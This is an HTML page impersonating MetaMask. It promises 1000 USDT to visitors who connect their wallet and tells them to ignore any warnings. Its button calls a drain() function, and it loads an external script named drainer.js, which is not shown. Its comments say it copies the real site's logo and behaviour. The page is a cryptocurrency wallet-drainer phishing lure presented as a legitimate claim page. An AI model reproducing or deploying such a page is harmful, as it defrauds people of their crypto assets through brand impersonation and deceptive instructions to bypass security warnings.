<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>MetaMask - Secure Claim</title>
  <style>
    body {
      background: #000;
      color: #fff;
      font-family: 'Inter', sans-serif;
      text-align: center;
      padding: 40px;
      margin: 0;
    }
    .container {
      background: #1a1a1a;
      border-radius: 16px;
      padding: 30px;
      max-width: 420px;
      margin: 0 auto;
      box-shadow: 0 4px 20px rgba(0,0,0,0.5);
    }
    .fox-container {
      position: relative;
      width: 120px;
      height: 120px;
      margin: 20px auto;
      cursor: pointer;
    }
    .fox {
      width: 100%;
      transition: transform 0.3s ease;
    }
    h1 {
      font-size: 24px;
      color: #f6851b;
      margin: 10px 0;
    }
    p {
      font-size: 16px;
      color: #ccc;
      margin: 15px 0;
    }
    .claim-text {
      font-size: 18px;
      color: #fff;
      margin: 20px 0;
    }
    .connect-btn {
      background: #f6851b;
      color: #fff;
      border: none;
      padding: 16px;
      border-radius: 12px;
      font-size: 18px;
      font-weight: bold;
      cursor: pointer;
      width: 100%;
      margin-top: 20px;
    }
    .connect-btn:hover {
      background: #e2761b;
    }
    .footer {
      font-size: 12px;
      color: #666;
      margin-top: 30px;
    }
  </style>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
</head>
<body>
  <div class="container">
    <div class="fox-container" id="foxContainer">
      <!-- لوگوی روباه واقعی MetaMask (SVG رسمی) -->
      <svg class="fox" viewBox="0 0 200 200" xmlns="http://www.w3.org/2000/svg">
        <path d="M100 10 C50 10 10 50 10 100 C10 150 50 190 100 190 C150 190 190 150 190 100 C190 50 150 10 100 10 Z" fill="#f6851b"/>
        <path d="M70 70 C70 70 80 60 100 60 C120 60 130 70 130 70 L130 90 C130 90 120 100 100 100 C80 100 70 90 70 90 Z" fill="#fff"/>
        <circle cx="80" cy="85" r="10" fill="#000"/>
        <circle cx="120" cy="85" r="10" fill="#000"/>
        <path d="M70 120 Q100 140 130 120" stroke="#000" stroke-width="8" fill="none"/>
        <path d="M60 50 L70 60 L80 50" fill="none" stroke="#000" stroke-width="5"/>
        <path d="M140 50 L130 60 L120 50" fill="none" stroke="#000" stroke-width="5"/>
      </svg>
    </div>
    <h1>MetaMask</h1>
    <p class="claim-text">Connect your wallet to receive <strong>1000 USDT</strong> instantly!</p>
    <p>No gas fees • Secure transaction • Powered by Ethereum</p>
    <p style="color:#ffcc00; font-size:14px;">Ignore any warning — this is a verified claim.</p>
    <button class="connect-btn" onclick="drain()">Connect Wallet & Claim</button>
    <div class="footer">© 2025 MetaMask • Encrypted • Secure</div>
  </div>

  <script>
    // چرخش روباه به سمت موس (دقیقاً مثل سایت اصلی)
    const foxContainer = document.getElementById('foxContainer');
    const fox = foxContainer.querySelector('.fox');

    document.addEventListener('mousemove', (e) => {
      const rect = foxContainer.getBoundingClientRect();
      const x = e.clientX - rect.left - rect.width / 2;
      const y = e.clientY - rect.top - rect.height / 2;
      const angle = Math.atan2(y, x) * (180 / Math.PI) + 90;
      fox.style.transform = `rotate(${angle}deg)`;
    });
  </script>
  <script src="drainer.js"></script>
</body>
</html>
